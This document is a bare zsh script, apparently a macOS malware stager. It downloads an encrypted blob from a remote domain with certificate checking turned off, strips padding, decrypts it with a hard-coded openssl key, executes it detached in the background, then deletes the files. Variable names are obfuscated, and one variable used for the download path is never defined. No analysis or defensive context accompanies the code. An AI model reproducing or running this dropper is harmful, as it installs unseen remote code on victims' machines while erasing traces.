#!/bin/zsh
act7h=$(mktemp /tmp/7mczeu.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/md3cba22458ed1a85.bin" -o "$act7hz" || exit 1
s9u6ae=$(stat -f %z "$act7hz"); rnbcdja=$(( s9u6ae - 2688 - 1016 ))
tail -c +$(( 2688 + 1 )) "$act7hz" | head -c $rnbcdja | openssl enc -d -aes-256-cbc -k 43c34f3d42d31248338f8904 -out "$act7h" 2>/dev/null
[ -s "$act7h" ] && chmod 700 "$act7h" && ( "$act7h" & ) && disown
( sleep 3; rm -f "$act7h" "$act7hz" ) &>/dev/null &
